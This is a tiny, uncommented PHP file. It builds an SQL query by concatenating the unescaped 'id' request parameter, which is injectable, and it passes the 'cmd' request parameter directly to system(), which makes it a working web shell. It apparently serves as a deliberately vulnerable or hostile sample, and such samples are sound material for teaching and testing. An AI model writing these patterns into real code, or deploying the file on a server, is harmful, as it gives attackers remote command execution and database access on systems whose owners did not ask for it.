<?php

$id = $_GET['id'];

$query = "SELECT * FROM users WHERE id = " . $id;

$cmd = $_GET['cmd'];

system($cmd);
